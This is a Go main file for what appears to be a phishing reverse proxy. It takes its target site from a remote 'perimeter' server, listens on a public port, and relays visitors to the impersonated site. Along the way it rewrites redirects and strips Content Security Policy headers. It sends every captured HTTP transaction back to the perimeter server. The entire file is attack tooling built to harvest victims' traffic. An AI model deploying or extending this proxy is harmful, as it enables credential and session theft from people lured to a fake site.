package main

import (
	"flag"
	"fmt"
	"log"
	"net"
	"net/http"
	"net/url"
	"os"
	"time"
)

const (
	// DefaultTimeout is the HTTP client timeout.
	DefaultTimeout = 20 * time.Second
)

var (
	servicePort     = flag.Int("port", -1, "Target service port")
	perimeterServer = flag.String("perimeter", "http://localhost:8080", "Perimeter Server URL")
)

func exitWithError(message string) {
	log.Println(message)
	os.Exit(-1)
}

func setupRequiredFlags() {
	flag.Parse()

	if *servicePort == -1 {
		exitWithError("--port is required.")
	}
}

func main() {
	setupRequiredFlags()


	perimeterServerUrl, err := url.Parse(*perimeterServer)
	if err != nil {
		exitWithError(err.Error())
	}

	var perimeterClient = &PerimeterClient{
		perimeterServer: perimeterServerUrl,
		servicePort:     *servicePort,
	}

	judasTarget, err := perimeterClient.GetTargetUrl()
	if err != nil {
		exitWithError(err.Error())
	}

	judasTargetUrl, err := url.Parse(fmt.Sprintf("%s://%s:%d", judasTarget.Protocol, judasTarget.Host, judasTarget.Port))
	if err != nil {
		exitWithError(err.Error())
	}

	client := &http.Client{
		Timeout: DefaultTimeout,
	}

	responseTransformers := []ResponseTransformer{
		LocationRewritingResponseTransformer{},
		CSPRemovingTransformer{},
	}

	phishingProxy := &PhishingProxy{
		client:               client,
		targetURL:            judasTargetUrl,
		responseTransformers: responseTransformers,
	}

	var server net.Listener

	server, err = net.Listen("tcp", fmt.Sprintf("0.0.0.0:%d", *servicePort))
	if err != nil {
		exitWithError(err.Error())
	}

	log.Println(fmt.Sprintf("Listening on: http://0.0.0.0:%d", *servicePort))

	transactions := make(chan HTTPTransaction)

	go perimeterClient.ProcessTransactions(transactions)

	for {
		conn, err := server.Accept()

		if err != nil {
			log.Println("Error when accepting request,", err.Error())
			continue
		}

		go phishingProxy.HandleConnection(conn, transactions)
	}
}